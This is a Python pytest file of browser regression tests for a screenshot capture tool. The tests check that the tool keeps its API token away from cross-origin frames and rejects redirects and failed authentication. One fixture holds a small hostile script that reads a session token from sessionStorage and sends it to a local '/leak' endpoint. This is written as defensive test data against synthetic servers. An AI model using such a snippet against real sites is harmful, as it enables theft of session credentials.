"""Opt-in browser regressions for capture safety; all tokens and servers are synthetic.

Set STUDIO_SCREENSHOT_CHROME and STUDIO_PUPPETEER_CORE to run. These tests do not
prove historical image provenance and never need a real Studio checkout store.
"""

from __future__ import annotations

import json
import os
import selectors
import shutil
import signal
import subprocess
import sys
import threading
from contextlib import contextmanager
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import parse_qs, urlsplit

import pytest

ROOT = Path(__file__).resolve().parents[1]
CAPTURE = ROOT / "scripts" / "capture_screenshots.mjs"
TOKEN = "synthetic-screenshot-token-0123456789"
TABS = ("start", "harness", "hall", "council", "debate", "chat")


@pytest.fixture
def browser_env(tmp_path: Path) -> dict[str, str]:
    if not os.environ.get("STUDIO_SCREENSHOT_CHROME") or not os.environ.get(
        "STUDIO_PUPPETEER_CORE"
    ):
        if os.environ.get("M5_REQUIRE_BROWSER_TESTS") == "1":
            pytest.fail("browser regressions are required but Chromium or puppeteer-core is not configured")
        pytest.skip(
            "set STUDIO_SCREENSHOT_CHROME and STUDIO_PUPPETEER_CORE for browser regressions"
        )
    env = os.environ.copy()
    env["HOME"] = str(tmp_path / "home")
    Path(env["HOME"]).mkdir()
    return env


@contextmanager
def server(handler: type[BaseHTTPRequestHandler]):
    httpd = ThreadingHTTPServer(("127.0.0.1", 0), handler)
    thread = threading.Thread(target=httpd.serve_forever, daemon=True)
    thread.start()
    try:
        yield f"http://127.0.0.1:{httpd.server_port}"
    finally:
        httpd.shutdown()
        httpd.server_close()
        thread.join()


def page(
    iframe: str = "",
    *,
    inert: bool = False,
    hidden: bool = False,
    transparent_parent: bool = False,
    navigate: str = "",
    broken_auth: bool = False,
) -> bytes:
    buttons = "".join(
        f'<button class="mode-tab" data-tab="{t}" onclick="switchTab(\'{t}\')">{t}</button>'
        for t in TABS
    )
    panes = "".join(f'<section class="pane" id="pane-{t}">{t}</section>' for t in TABS)
    switch = (
        ""
        if inert
        else """
      document.querySelectorAll('.mode-tab').forEach(b => {
        b.classList.toggle('active', b.dataset.tab === tab);
        if (b.dataset.tab === tab) b.setAttribute('aria-current', 'page');
        else b.removeAttribute('aria-current');
      });
      document.querySelectorAll('.pane').forEach(p => p.classList.toggle('active', p.id === 'pane-' + tab));
    """
    )
    auth = (
        ""
        if broken_auth
        else """
      const nativeFetch = window.fetch.bind(window);
      window.fetch = (url, options = {}) => nativeFetch(url, {...options, headers: {Authorization: 'Bearer ' + sessionStorage.getItem('m5_api_token')}});
    """
    )
    navigation = (
        f"if (tab === 'start') location.href = {json.dumps(navigate)};"
        if navigate
        else ""
    )
    return f"""<!doctype html><style>.pane {{display:none}} .pane.active {{display:{"none" if hidden else "block"}}}</style>
      <nav>{buttons}</nav><main style="opacity:{0 if transparent_parent else 1}">{panes}</main>{iframe}<script>{auth}
      function switchTab(tab) {{{switch} {navigation}}} switchTab('harness');</script>""".encode()


def _run(
    base: str,
    out: Path,
    env: dict[str, str],
    *,
    token: str = TOKEN,
    manifest: Path | None = None,
    flags: tuple[str, ...] = (),
):
    return subprocess.run(
        [
            "node",
            str(CAPTURE),
            "--base-url",
            base,
            "--token",
            token,
            "--out",
            str(out),
            "--manifest",
            str(manifest or ROOT / "docs/media/screenshots/manifest.json"),
            "--timeout-ms",
            "4000",
            *flags,
        ],
        cwd=ROOT,
        env=env,
        capture_output=True,
        text=True,
        timeout=40,
        check=False,
    )


def test_capture_positive_and_cross_origin_frame_is_not_seeded(
    tmp_path: Path, browser_env: dict[str, str]
) -> None:
    received: list[str] = []

    class Other(BaseHTTPRequestHandler):
        def do_GET(self):
            parsed = urlsplit(self.path)
            if parsed.path == "/leak":
                received.append(
                    parse_qs(parsed.query, keep_blank_values=True).get("token", [""])[0]
                )
                self.send_response(204)
                self.end_headers()
                return
            body = b"<script>fetch('/leak?token='+encodeURIComponent(sessionStorage.getItem('m5_api_token')||''))</script>"
            self.send_response(200)
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, *_args):
            pass

    with server(Other) as other:

        class Main(BaseHTTPRequestHandler):
            def do_GET(self):
                if self.path == "/api/workspace/directory":
                    if self.headers.get("Authorization") != f"Bearer {TOKEN}":
                        self.send_response(401)
                        self.end_headers()
                        return
                    body = b'{"workspace_dir":"/synthetic","recent_dirs":[]}'
                    self.send_response(200)
                    self.send_header("Content-Type", "application/json")
                    self.end_headers()
                    self.wfile.write(body)
                    return
                body = page(f'<iframe src="{other}/"></iframe>')
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.end_headers()
                self.wfile.write(body)

            def log_message(self, *_args):
                pass

        with server(Main) as origin:
            out = tmp_path / "capture"
            result = _run(origin, out, browser_env)
    assert result.returncode == 0, result.stderr
    assert len(list(out.glob("*.png"))) == 6
    assert (out / "index.json").is_file()
    assert received == [""]
    assert TOKEN not in result.stdout + result.stderr


@pytest.mark.parametrize(
    "kind",
    [
        "unrelated",
        "inert",
        "hidden",
        "transparent-parent",
        "bad-token",
        "auth-disabled",
        "redirect",
        "api-redirect",
        "late-navigation",
        "browser-unauthenticated",
        "variant-not-applied",
        "error-document",
    ],
)
def test_capture_rejects_invalid_pages_auth_and_redirects(
    tmp_path: Path, browser_env: dict[str, str], kind: str
) -> None:
    redirect_requests: list[str] = []

    class Target(BaseHTTPRequestHandler):
        def do_GET(self):
            redirect_requests.append(self.path)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(page())

        def log_message(self, *_args):
            pass

    with server(Target) as target:

        class Main(BaseHTTPRequestHandler):
            def do_GET(self):
                if self.path == "/api/workspace/directory":
                    if (
                        kind != "auth-disabled"
                        and self.headers.get("Authorization") != f"Bearer {TOKEN}"
                    ):
                        self.send_response(401)
                        self.end_headers()
                        return
                    if kind == "api-redirect":
                        self.send_response(302)
                        self.send_header("Location", target + "/")
                        self.end_headers()
                        return
                    self.send_response(200)
                    self.send_header("Content-Type", "application/json")
                    self.end_headers()
                    self.wfile.write(b'{"workspace_dir":"/synthetic","recent_dirs":[]}')
                    return
                if kind == "redirect":
                    self.send_response(302)
                    self.send_header("Location", target + "/")
                    self.end_headers()
                    return
                body = (
                    b"""<html><body>Not Studio<script>
                    const nativeFetch = window.fetch.bind(window);
                    window.fetch = (url, options = {}) => nativeFetch(url, {...options, headers:
                      {Authorization: 'Bearer ' + sessionStorage.getItem('m5_api_token')}});
                    </script></body></html>"""
                    if kind == "unrelated"
                    else page(
                        inert=kind == "inert",
                        hidden=kind == "hidden",
                        transparent_parent=kind == "transparent-parent",
                        navigate=target if kind == "late-navigation" else "",
                        broken_auth=kind == "browser-unauthenticated",
                    )
                )
                self.send_response(404 if kind == "error-document" else 200)
                self.send_header("Content-Type", "text/html")
                self.end_headers()
                self.wfile.write(body)

            def log_message(self, *_args):
                pass

        with server(Main) as origin:
            out = tmp_path / "capture"
            out.mkdir()
            sentinel = out / "index.json"
            sentinel.write_text("existing-index", encoding="utf-8")
            result = _run(
                origin,
                out,
                browser_env,
                token="incorrect-synthetic-token-0123456789"
                if kind == "bad-token"
                else TOKEN,
                flags=("--emulate-theme", "light")
                if kind == "variant-not-applied"
                else (),
            )
    assert result.returncode != 0, result.stdout
    assert list(out.glob("*.png")) == []
    assert sentinel.read_text(encoding="utf-8") == "existing-index"
    assert TOKEN not in result.stdout + result.stderr
    if kind == "unrelated":
        assert "missing or ambiguous tab" in result.stderr
    if kind in {"inert", "hidden", "transparent-parent"}:
        assert "did not display the expected pane" in result.stderr
    if kind == "bad-token":
        assert "did not accept the supplied token" in result.stderr
    if kind == "auth-disabled":
        assert "did not require authentication" in result.stderr
    if kind == "browser-unauthenticated":
        assert "browser could not authenticate" in result.stderr
    if kind == "variant-not-applied":
        assert "theme or density was not applied" in result.stderr
    if kind == "error-document":
        assert "direct successful HTML" in result.stderr
    if kind in {"redirect", "api-redirect", "late-navigation"}:
        assert redirect_requests == []


def test_real_isolated_demo_captures_all_six_panes(
    tmp_path: Path, browser_env: dict[str, str]
) -> None:
    """Exercise the actual app and switch controls, not only the synthetic fixture."""
    source = tmp_path / "source"
    source.mkdir()
    for module in ROOT.glob("*.py"):
        shutil.copy2(module, source / module.name)
    for directory in ("scripts", "docs", "product", "static"):
        shutil.copytree(
            ROOT / directory,
            source / directory,
            ignore=shutil.ignore_patterns("__pycache__"),
        )
    store = source / ".harnesses" / "sessions"
    store.mkdir(parents=True)
    sentinel = store / "workspace_prefs.json"
    sentinel.write_text('{"default_dir":"synthetic-source-marker"}', encoding="utf-8")
    before = sentinel.read_bytes()
    env = browser_env.copy()
    env.pop("PYTHONPATH", None)
    env.pop("STUDIO_DB_PATH", None)
    demo = subprocess.Popen(
        [
            sys.executable,
            str(source / "scripts/demo_tour.py"),
            "--serve",
            "--root",
            str(tmp_path / "demo"),
        ],
        cwd=source,
        env=env,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        start_new_session=True,
    )
    try:
        assert demo.stdout is not None
        with selectors.DefaultSelector() as selector:
            selector.register(demo.stdout, selectors.EVENT_READ)
            assert selector.select(timeout=40), "demo did not start within 40 seconds"
            banner_line = demo.stdout.readline()
        assert banner_line, "demo exited before publishing its banner"
        banner = json.loads(banner_line)
        out = tmp_path / "actual-capture"
        result = _run(banner["url"], out, browser_env, token=banner["token"])
        assert result.returncode == 0, result.stderr
        assert len(list(out.glob("*.png"))) == 6
        assert [
            entry["tab"]
            for entry in json.loads((out / "index.json").read_text())["shots"]
        ] == list(TABS)
        assert banner["token"] not in result.stdout + result.stderr
        variant_out = tmp_path / "variant-capture"
        variant = _run(
            banner["url"],
            variant_out,
            browser_env,
            token=banner["token"],
            flags=(
                "--panes",
                "chat,start",
                "--emulate-theme",
                "light",
                "--emulate-density",
                "compact",
                "--viewport",
                "900x800",
            ),
        )
        assert variant.returncode == 0, variant.stderr
        index = json.loads((variant_out / "index.json").read_text())
        assert index["variant"] == {"theme": "light", "density": "compact"}
        assert index["viewport"]["width"] == 900 and index["viewport"]["height"] == 800
        assert [entry["tab"] for entry in index["shots"]] == ["start", "chat"]
        assert {p.name for p in variant_out.glob("*.png")} == {"start.png", "chat.png"}
        assert banner["token"] not in variant.stdout + variant.stderr
        assert sentinel.read_bytes() == before
        assert [p for p in store.rglob("*") if p.is_file()] == [sentinel]
    finally:
        if demo.poll() is None:
            os.killpg(demo.pid, signal.SIGINT)
        try:
            demo.communicate(timeout=15)
        except subprocess.TimeoutExpired:
            os.killpg(demo.pid, signal.SIGKILL)
            demo.communicate(timeout=5)
